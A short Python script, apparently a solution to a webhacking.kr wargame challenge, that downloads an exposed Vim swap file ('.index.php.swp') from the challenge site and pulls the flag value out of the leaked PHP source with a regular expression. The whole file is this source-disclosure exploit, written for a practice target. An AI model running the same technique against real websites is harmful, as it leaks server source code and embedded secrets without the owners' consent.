import requests
import re

url = 'https://webhacking.kr/challenge/bonus-8/'
fn = '.index.php.swp'

response = requests.get(url+fn)
flag = re.findall('\$flag = "(.*)"', response.text)[0]
print(flag)

